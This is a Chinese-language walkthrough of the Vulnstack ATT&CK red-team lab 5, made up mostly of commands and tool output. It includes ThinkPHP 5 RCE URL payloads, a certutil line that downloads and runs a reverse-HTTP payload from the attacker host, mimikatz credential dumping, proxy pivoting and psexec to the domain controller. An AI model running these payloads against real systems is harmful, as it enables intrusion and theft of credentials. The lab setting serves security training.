---
title: ATT&CK红队评估实战靶场(五)
published: 2025-03-09 16:20:01
tags: [Vulnstack,域渗透]
category: 靶机
draft: false
---

# ATT&CK红队评估实战靶场(五)

**win7** 双网卡模拟内外网 `192.168.138.136` `192.168.183.134`

sun\leo 123.com

sun\Administrator dc123.com

**2008** `192.168.138.138`

sun\admin 2021.com

**Kali** `192.168.183.133`

## 前期踩点

`192.168.183.134` 是靶机

```python
⚡ root@kali  ~  nmap -sP 192.168.183.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 05:06 EST
Nmap scan report for 192.168.183.1
Host is up (0.00033s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.183.134
Host is up (0.00017s latency).
MAC Address: 00:0C:29:69:C1:18 (VMware)
Nmap scan report for 192.168.183.254
Host is up (0.00017s latency).
MAC Address: 00:50:56:F8:FE:A2 (VMware)
```

开启了`HTTP`服务和`Mysql`

```
⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 192.168.183.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 07:02 EST
Nmap scan report for 192.168.183.134
Host is up (0.00091s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:69:C1:18 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
```

`Apache` ，并且是`Windows`系统

```python
⚡ root@kali  ~  nmap -sT -A -T4 -O -p 80,3306 192.168.183.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 07:03 EST
Nmap scan report for 192.168.183.134
Host is up (0.00053s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.5.38
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:69:C1:18 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 8.1 R1 (96%), Microsoft Windows Phone 7.5 or 8.0 (96%), Microsoft Windows Embedded Standard 7 (96%), Microsoft Windows Server 2008 or 2008 Beta 3 (92%), Microsoft Windows Server 2008 R2 or Windows 8.1 (92%), Microsoft Windows 7 Professional or Windows 8 (92%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (92%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (92%), Microsoft Windows 7 (90%), Microsoft Windows Server 2008 SP1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.53 ms 192.168.183.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.39 seconds
```

`nmap`扫描漏洞

```python
⚡ root@kali  ~  nmap -script=vuln -p 80,3306 192.168.183.134 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 07:05 EST
Nmap scan report for 192.168.183.134
Host is up (0.00030s latency).

PORT     STATE SERVICE
80/tcp   open  http
|_http-trace: TRACE is enabled
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|   /0/: Potentially interesting folder
|_  /index/: Potentially interesting folder
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
3306/tcp open  mysql
MAC Address: 00:0C:29:69:C1:18 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 86.40 seconds
```

`nikto`扫描漏洞

```python
 ⚡ root@kali  ~  nikto -url 192.168.183.134 -p 80            
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.183.134
+ Target Hostname:    192.168.183.134
+ Target Port:        80
+ Start Time:         2025-02-19 07:22:12 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.5.38
+ /: Retrieved x-powered-by header: PHP/5.5.38.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.23 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OpenSSL/1.0.2j appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ PHP/5.5.38 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ PHP/5.5 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8101 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2025-02-19 07:26:25 (GMT-5) (253 seconds)
---------------------------------------------------------------------------                                                                                            
```

没扫描什么漏洞

访问`HTTP` 并检测指纹，搭建的是`Thinkphp`

![image.png](image%2059.png)

上面`nmap`扫描出存在`robots`文件以及一些有趣的文件夹

![image.png](image%2060.png)

没找到可以利用的，先爆破目录

```python
⚡ root@kali  ~  dirsearch -u http://192.168.183.134 -x 403 -e php,zip,txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/reports/http_192.168.183.134/_25-02-19_07-36-13.txt

Target: http://192.168.183.134/

[07:36:13] Starting: 
[07:37:00] 404 -  236B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[07:37:06] 404 -  205B  - /a%5c.aspx
[07:37:14] 200 -    2KB - /add.php
[07:38:53] 200 -    1KB - /favicon.ico
[07:40:24] 200 -   24B  - /robots.txt
[07:40:43] 301 -  238B  - /static  ->  http://192.168.183.134/static/
[07:40:43] 301 -  240B  - /static..  ->  http://192.168.183.134/static../
```

扫出来一个`add.php` ,访问，看着像是一个马？尝试爆破无果

![image.png](image%2061.png)

## ThinkPHP5 RCE

访问主页时可以看到是`ThinkPHP5` ，那么我们尝试一下它的已知漏洞

使用`MSF`的`ThinkPHP5 RCE`的`EXP`无法成功获得`shell` ，但是可以知道是存在`RCE`漏洞的

```python
msf6 exploit(unix/webapp/thinkphp_rce) > run

[*] Started reverse TCP handler on 192.168.183.133:1234 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. ThinkPHP 5.0.22 is a vulnerable version.
[*] Targeting ThinkPHP 5.0.22 automatically
[*] Using URL: http://192.168.183.133:8081/OcBqkRdcc
[+] Successfully executed command: curl -so /tmp/OQKmjuhK http://192.168.183.133:8081/OcBqkRdcc;chmod +x /tmp/OQKmjuhK;/tmp/OQKmjuhK;rm -f /tmp/OQKmjuhK
[*] Command Stager progress - 100.00% done (117/117 bytes)
[*] Server stopped.
[*] Exploit completed, but no session was created.
```

拿搜索的`POC`进行利用

```python
http://192.168.183.134/?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=100
```

可以成功回显

![image.png](image%2062.png)

执行`whoami`

```python
http://192.168.183.134/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

![image.png](image%2063.png)

尝试读取`add.php` 是否能看到密码

```python
http://192.168.183.134/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir
```

![image.png](image%2064.png)

```python
http://192.168.183.134/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=type add.php
```

![image.png](image%2065.png)

读到密码的`MD5`值`2aefc34200a294a3cc7db81b43a81873`，将其放到`john`进行爆破

```python
⚡ root@kali  ~/Desktop/test/ATTCK5  john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
admins           (?)     
1g 0:00:00:00 DONE (2025-02-19 08:15) 33.33g/s 4467Kp/s 4467Kc/s 4467KC/s applecute..PHOEBE
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

得到密码`admins` ，访问`add.php` 输入密码，成功进入

![image.png](image%2066.png)

## 获得立足点

使用`msfvenom`生成`payload`

```python
⚡ root@kali  ~/Desktop/test/ATTCK5  msfvenom -p cmd/windows/http/x64/meterpreter/reverse_http lport=4444 lhost=192.168.183.133  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 125 bytes
certutil -urlcache -f http://192.168.183.133:8080/9Bk3xvWa9yQk92crn4JtvA %TEMP%\AVQtnvStA.exe & start /B %TEMP%\AVQtnvStA.exe
 ⚡ root@kali  ~/Desktop/test/ATTCK5  
```

然后`MSF`开启监听

```python
msf6 > use exploit/multi/handler                                                                                                                                           
msf6 exploit(multi/handler) > set payload cmd/windows/http/x64/meterpreter/reverse_http                                                                                                                                             
payload => cmd/windows/http/x64/meterpreter/reverse_http   
msf6 exploit(multi/handler) > set lport 4444                                                                                                                                                                                        
msf6 exploit(multi/handler) > set lhost 192.168.183.133                                                                                                                                                                             
msf6 exploit(multi/handler) > run  
[*] Started HTTP reverse handler on http://192.168.183.133:4444                   
```

然后在`web`端大马的命令执行中执行生成的`payload`

![image.png](image%2067.png)

成功弹回`shell` ，获得立足点

```python
[*] Started HTTP reverse handler on http://192.168.183.133:4444                                                                                                                                                                     
[!] http://192.168.183.133:4444 handling request from 192.168.183.134; (UUID: xyuftsit) Without a database connected that payload UUID tracking will not work!                                                                      
[*] http://192.168.183.133:4444 handling request from 192.168.183.134; (UUID: xyuftsit) Staging x64 payload (204892 bytes) ...                                                                                                      
[!] http://192.168.183.133:4444 handling request from 192.168.183.134; (UUID: xyuftsit) Without a database connected that payload UUID tracking will not work!                                                                      
[*] Meterpreter session 4 opened (192.168.183.133:4444 -> 192.168.183.134:49411) at 2025-02-19 08:36:17 -0500                                                                                                                       
                                                                                                                  
meterpreter >                                                                                                      
```

查看`ip`信息，得知内网网段是`192.168.138.0`

```python
meterpreter > ipconfig
Interface 11                  
============                
Name         : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:69:c1:18    
MTU          : 1500
IPv4 Address : 192.168.183.134
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::c060:f526:12b5:625b
IPv6 Netmask : ffff:ffff:ffff:ffff::   

Interface 16            
============      
Name         : Intel(R) PRO/1000 MT Network Connection #2
Hardware MAC : 00:0c:29:69:c1:22                         
MTU          : 1500                                      
IPv4 Address : 192.168.138.136
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::31e6:d7f6:258a:61d4              
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

## 搭建隧道

需要搭建隧道通到`kali`方便进行信息收集

使用`MSF`的`socks_proxy` 

```python
meterpreter > bg
[*] Backgrounding session 4...
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > set version 5
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
```

添加路由

```python
meterpreter > run post/multi/manage/autoroute 

[*] Running module against WIN7
[*] Searching for subnets to autoroute.
[+] Route added to subnet 192.168.138.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.183.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 169.254.0.0/255.255.0.0 from Bluetooth vc6.
```

`kali`设置`proxychain`

```python
vim /etc/proxychains4.conf

socks5  127.0.0.1       1080
```

测试是否成功，搭建成功

```python
⚡ root@kali  ~/Desktop/test/ATTCK5  proxychains4 curl 192.168.138.136
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.138.136:80  ...  OK
<style type="text/css">*{ padding: 0; margin: 0; } .think_default_text{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:)</h1><p> ThinkPHP V5<br/><span style="font-size:30px">十年磨一剑 - 为API开发设计的高性能框架</span></p><span style="font-size:22px;">[ V5.0 版本由 <a href="http://www.qiniu.com" target="qiniu">七牛云</a> 独家赞助发布 ]</span></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="ad_bd568ce7058a1091"></think>
```

## 信息收集

加载`mimikatz`

```python
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

挂在`SYSTEM`用户的进程下

```python
meterpreter > ps                                                                                                  

Process List             
============                     
                                                         
 PID   PPID  Name               Arch  Session  User                          Path
  ---   ----  ----               ----  -------  ----                          ----                           
 0     0     [System Process]                                                                                                                                                                                                       
 4     0     System             x64   0                                                                           
 252   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe  
 336   328   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe                                                                                                                          
 352   468   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 388   328   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe 
 400   380   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 468   388   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 476   388   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe  
```

```python
meterpreter > migrate 476
[*] Migrating from 1568 to 476...
[*] Migration completed successfully.    
```

使用`mimikatz`获得密码

```python
meterpreter > creds_all                                                                                                                                                                                                             
[+] Running as SYSTEM                                                                                                                                                                                                               
[*] Retrieving all credentials                           
msv credentials                                          
===============
Username       Domain  LM                                NTLM                              SHA1             
--------       ------  --                                ----                              ----             
Administrator  SUN     c8c42d085b5e3da2e9260223765451f1  e8bea972b3549868cecd667a64a6ac46  3688af445e35efd8a4d4e0a9eb90b754a2f3a4ee                                                                                                 
WIN7$          SUN                                       8e7d680b96dac27b50e781098dacb63b  c7a665b653036a52a350263fdacd163703a11a9a                                                                                                 
leo            SUN     b73a13e9b7832a35aad3b435b51404ee  afffeba176210fad4628f0524bfe1942  fa83a92197d9896cb41463b7a917528b4009c650                                                                                                 
                                                                                                                  
wdigest credentials                                                                                               
===================                                                                                               
                                                                                                                  
Username       Domain  Password                                                                                   
--------       ------  --------                                                                                   
(null)         (null)  (null)                                                                                                                                                                                                       
Administrator  SUN     dc123.com                                                                                  
WIN7$          SUN     96 d1 ff bb a7 5d 4d 85 54 f2 1c 5a 58 20 69 4f 9e 21 a7 6e 3e 50 43 b6 e6 6c 8b 93 28 bc 32 7c f9 c3 62 aa a0 e0 7c ba 11 f9 00 d1 58 f8 d1 f0 cc f7 a4 e7 c8 d8 5f 72 35 6d bd f5 fa 67 09 27 4f 53 8f 28  
                        25 80 ab f9 2b 6c aa ce a4 b5 7d 06 26 6e 07 8e 9f 21 9b 43 cf 54 61 78 09 58 14 87 29 09 a2 c8 5c 2d f1 a5 23 37 5e c6 ee 3c 26 6d 0d b5 54 af 70 f5 38 c0 4f 2c 4a d6 0b 22 95 12 9a e8 73 c7 b3 ae 97 1  
                       5 dd d5 96 30 28 24 d9 47 01 f1 8a 5c 04 ac d3 1a 43 7a 9e 5c f0 c9 ed 47 4f 7a 6a 9c c6 93 f6 16 0c da 16 d6 e9 3a 88 02 6b e1 67 8b 1a d5 e3 93 36 ec 01 c9 60 2c d2 b0 43 46 0b 86 2a 3c 3b 42 0a c9 b8   
                       ae 28 56 c3 2e 8e 9d db 5c 7b a5 4a 92 d2 28 f9 e3 f1 ca 1e 1d 30 b5 85 fe db 60 85 2d a0 ee 08 00 88 73 69 2a                                                                                               
leo            SUN     123.com                                                                                    
                                                                                                                  
tspkg credentials                                                                                                 
=================                                                                                                                                                                                                                   
                                                                                                                  
Username       Domain  Password                                                                                                                                                                                                     
--------       ------  --------                                                                                   
Administrator  SUN     dc123.com                                                                                                                                                                                                    
leo            SUN     123.com                                                                                    
                                                                                                                  
kerberos credentials                                                                                                                                                                                                                
====================                                                                                              
                                                                                                                  
Username       Domain   Password                                                                                  
--------       ------   --------                                                                                  
(null)         (null)   (null)                                                                                    
Administrator  SUN.COM  dc123.com                        
leo            SUN.COM  123.com
win7$          SUN.COM  96 d1 ff bb a7 5d 4d 85 54 f2 1c 5a 58 20 69 4f 9e 21 a7 6e 3e 50 43 b6 e6 6c 8b 93 28 bc 32 7c f9 c3 62 aa a0 e0 7c ba 11 f9 00 d1 58 f8 d1 f0 cc f7 a4 e7 c8 d8 5f 72 35 6d bd f5 fa 67 09 27 4f 53 8f 2  
                        8 25 80 ab f9 2b 6c aa ce a4 b5 7d 06 26 6e 07 8e 9f 21 9b 43 cf 54 61 78 09 58 14 87 29 09 a2 c8 5c 2d f1 a5 23 37 5e c6 ee 3c 26 6d 0d b5 54 af 70 f5 38 c0 4f 2c 4a d6 0b 22 95 12 9a e8 73 c7 b3 ae 97  
                         15 dd d5 96 30 28 24 d9 47 01 f1 8a 5c 04 ac d3 1a 43 7a 9e 5c f0 c9 ed 47 4f 7a 6a 9c c6 93 f6 16 0c da 16 d6 e9 3a 88 02 6b e1 67 8b 1a d5 e3 93 36 ec 01 c9 60 2c d2 b0 43 46 0b 86 2a 3c 3b 42 0a c9   
                        b8 ae 28 56 c3 2e 8e 9d db 5c 7b a5 4a 92 d2 28 f9 e3 f1 ca 1e 1d 30 b5 85 fe db 60 85 2d a0 ee 08 00 88 73 69 2a 
```

`Administrator`  `dc123.com`  以及 `leo`  `123.com`

上传`fscan`进行探测

```python
meterpreter > cd C:/

meterpreter > upload ~/Desktop/Tools/fscan.exe
[*] Uploading  : /root/Desktop/Tools/fscan.exe -> fscan.exe
[*] Uploaded 8.00 MiB of 8.33 MiB (96.02%): /root/Desktop/Tools/fscan.exe -> fscan.exe
[*] Uploaded 8.33 MiB of 8.33 MiB (100.0%): /root/Desktop/Tools/fscan.exe -> fscan.exe
[*] Completed  : /root/Desktop/Tools/fscan.exe -> fscan.exe

meterpreter > ls
Listing: C:\
============

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  0        dir   2020-03-04 12:06:50 -0500  $Recycle.Bin
100444/r--r--r--  8192     fil   2020-03-04 11:42:03 -0500  BOOTSECT.BAK
040777/rwxrwxrwx  4096     dir   2020-03-04 11:42:03 -0500  Boot
040777/rwxrwxrwx  0        dir   2009-07-14 01:08:56 -0400  Documents and Settings
040777/rwxrwxrwx  0        dir   2009-07-13 23:20:08 -0400  PerfLogs
040555/r-xr-xr-x  4096     dir   2025-02-18 09:50:47 -0500  Program Files
040555/r-xr-xr-x  4096     dir   2009-07-14 00:57:06 -0400  Program Files (x86)
040777/rwxrwxrwx  4096     dir   2025-02-18 09:56:46 -0500  ProgramData
040777/rwxrwxrwx  0        dir   2020-03-04 11:44:56 -0500  Recovery
040777/rwxrwxrwx  4096     dir   2025-02-18 09:50:09 -0500  System Volume Information
040555/r-xr-xr-x  4096     dir   2020-03-04 12:07:56 -0500  Users
040777/rwxrwxrwx  16384    dir   2025-02-19 08:35:48 -0500  Windows
100444/r--r--r--  383786   fil   2010-11-20 22:23:51 -0500  bootmgr
100777/rwxrwxrwx  8736768  fil   2025-02-19 10:11:12 -0500  fscan.exe
000000/---------  0        fif   1969-12-31 19:00:00 -0500  pagefile.sys
040777/rwxrwxrwx  8192     dir   2020-03-04 11:48:52 -0500  phpStudy
```

```python
C:\>fscan.exe -h 192.168.138.1/24                                                                                 
┌──────────────────────────────────────────────┐                                                                  
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                         
[2025-02-19 23:13:52] [INFO] 暴力破解线程数: 1
[2025-02-19 23:13:52] [INFO] 开始信息扫描
[2025-02-19 23:13:52] [INFO] CIDR范围: 192.168.138.0-192.168.138.255                                              
[2025-02-19 23:13:52] [INFO] 生成IP范围: 192.168.138.0.%!d(string=192.168.138.255) - %!s(MISSING).%!d(MISSING)    
[2025-02-19 23:13:52] [INFO] 解析CIDR 192.168.138.1/24 -> IP范围 192.168.138.0-192.168.138.255                    
[2025-02-19 23:13:52] [INFO] 最终有效主机数量: 256
[2025-02-19 23:13:52] [INFO] 开始主机扫描
[2025-02-19 23:13:52] [SUCCESS] 目标 192.168.138.136 存活 (ICMP)                                                  
[2025-02-19 23:13:52] [SUCCESS] 目标 192.168.138.138 存活 (ICMP)                                                  
[2025-02-19 23:13:58] [INFO] 存活主机数量: 3
[2025-02-19 23:13:58] [INFO] 有效端口数量: 233
[2025-02-19 23:13:58] [SUCCESS] 端口开放 192.168.138.136:80                                                       
[2025-02-19 23:13:58] [SUCCESS] 端口开放 192.168.138.138:135                                                      
[2025-02-19 23:13:58] [SUCCESS] 端口开放 192.168.138.136:135                                                      
[2025-02-19 23:13:58] [SUCCESS] 端口开放 192.168.138.138:88                                                       
[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.138:139                                                      
[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.136:139                                                      
[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.138:389                                                      
[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.138:445                                                      
[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.136:445                                                      
[2025-02-19 23:14:03] [SUCCESS] 服务识别 192.168.138.136:80 => [http]                                             
[2025-02-19 23:14:03] [SUCCESS] 服务识别 192.168.138.138:88 =>                                                    
[2025-02-19 23:14:04] [SUCCESS] 端口开放 192.168.138.136:3306                                                     
[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.136:3306 => [mysql] 产品:MySQL 信息:unauthorized Banner:[E.j Host 'win7.sun.com' is not allowed to connect to this MySQL server]                                               
[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.138:139 =>  Banner:[.]                                       
[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.136:139 =>  Banner:[.]                                       
[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.138:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: sun.com, Site: Default-First-Site-Name                                                
[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.138:445 =>                                                   
[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.136:445 =>                                                   
[2025-02-19 23:15:03] [SUCCESS] 服务识别 192.168.138.138:135 =>                                                   
[2025-02-19 23:15:03] [SUCCESS] 服务识别 192.168.138.136:135 =>                                                   
[2025-02-19 23:15:03] [INFO] 存活端口数量: 13   
[2025-02-19 23:15:03] [INFO] 开始漏洞扫描       
[2025-02-19 23:15:03] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle                                                                                                              
[2025-02-19 23:15:04] [SUCCESS] NetInfo 扫描结果
目标主机: 192.168.138.136                                
主机名: win7                                  
发现的网络接口:                          
   IPv4地址:                                                                                                      
      └─ 192.168.138.136                                                                                          
      └─ 192.168.183.134                                                                                          
[2025-02-19 23:15:04] [SUCCESS] 发现漏洞 192.168.138.136 [Windows 7 Professional 7601 Service Pack 1] MS17-010    
[2025-02-19 23:15:04] [SUCCESS] 网站标题 http://192.168.138.136    状态码:200 长度:931    标题:无标题             
[2025-02-19 23:15:04] [SUCCESS] NetInfo 扫描结果                                                                                                                                                 
主机名: DC                                                                                                        
发现的网络接口:                                                                                                   
   IPv4地址:                                                                                                      
      └─ 192.168.138.138                                                                                                                                                                                                            
[2025-02-19 23:15:04] [SUCCESS] NetBios 192.168.138.1   WORKGROUP\DESKTOP-OO4DPSM     
[2025-02-19 23:15:04] [SUCCESS] NetBios 192.168.138.136 win7.sun.com                        Windows 7 Professional 7601 Service Pack 1                                                                                              
[2025-02-19 23:15:04] [SUCCESS] 发现漏洞 192.168.138.138 [Windows Server 2008 HPC Edition 7600] MS17-010
[2025-02-19 23:15:04] [SUCCESS] NetBios 192.168.138.138 DC:DC.sun.com                    Windows Server 2008 HPC Edition 7600                                                       
[2025-02-19 23:15:16] [SUCCESS] 目标: http://192.168.138.136:80
  漏洞类型: poc-yaml-thinkphp5-controller-rce
  漏洞名称: 
  详细信息:
        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
[2025-02-19 23:15:16] [SUCCESS] 目标: http://192.168.138.136:80
  漏洞类型: poc-yaml-thinkphp5023-method-rce
  漏洞名称: poc1
  详细信息:
        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce                                                                                                                                               
```

看信息可以知道`DC`是`192.168.138.138` ，域是`sun.com` ，并且开启`135`，`139`，`445`

## PTH

因为上面获得域用户，尝试`PTH` 

`wmiexec.exe`失败

```python
⚡ root@kali  ~  proxychains4 wmiexec.py sun.com/administrator:dc123.com@dc.sun.com -target-ip 192.168.138.138 
                                                                                                                  
[proxychains] config file found: /etc/proxychains4.conf                                                           
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                            
[proxychains] DLL init: proxychains-ng 4.17              
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                             
                                                                                                                  
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.138.138:445  ...  OK                                
[*] SMBv2.1 dialect used                                                                                          
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.138.138:135  ...  OK                                
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.sun.com:49154 <--socket error or timeout!                
[-] Could not connect: [Errno 111] Connection refused    
```

`evil-winrm`失败

```python
同上
```

`psexec.py`成功，成功了，拿下域控

```python
 ⚡ root@kali  ~  proxychains4 psexec.py administrator:dc123.com@192.168.138.138
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.138.138:445  ...  OK
[*] Requesting shares on 192.168.138.138.....
[*] Found writable share ADMIN$
[*] Uploading file KNuZDebw.exe
[*] Opening SVCManager on 192.168.138.138.....
[*] Creating service efVz on 192.168.138.138.....
[*] Starting service efVz.....
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.138.138:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.138.138:445  ...  OK
[!] Press help for extra shell commands
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.138.138:445  ...  OK
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [�汾 6.1.7600]

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32> whoami
nt authority\system
```

## 总结

其实可以使用`CobaltStrike` 更方便，但是想试试使用`Linux`环境来尝试进行域攻击

